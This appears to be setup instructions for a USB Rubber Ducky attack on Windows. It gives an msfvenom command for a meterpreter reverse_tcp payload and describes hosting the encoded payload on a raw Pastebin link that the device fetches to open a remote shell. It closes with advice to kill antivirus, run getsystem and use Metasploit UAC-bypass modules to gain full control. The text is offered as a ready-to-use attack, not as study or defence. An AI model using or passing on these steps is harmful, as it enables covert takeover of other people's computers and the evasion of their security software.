Configuration:
Generate payload using this command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -f psh-cmd --smallest Cut the payload down to JUST the base64. 
Upload to pastebin, my example: https://pastebin.com/KQpwbiRS.
Then, simply convert this URL to a raw URL by adding a /raw/ in it
You can URL shorten it if you'd like, just make sure you use the raw link and not the normal pastebin link.

Now change the $u='YOUR_LINK' to your URL (e.g. $u='https://pastebin.com/raw/KQpwbiRS').
Then simply upload it to your rubber ducky, and you can get extremely fast shells.

NOTE: It is recommended you migrate the shell and kill antivirus as soon as possible, as most antiviruses will pick up on a meterpreter shell and kill it. 
Running getsystem command on meterpreter is also great. 
Use the windows/local/bypassuac modules (find them with the command search bypassuac, 
I find that exploit/windows/local/bypassuac_injection_winsxs works very well for my Windows 10 device, disabled antivirus of course!) for Windows 8 and up.
This will allow you to bypass the UAC on windows, any level, and be able to freely run the getsystem command, which essentially lets you do anything.
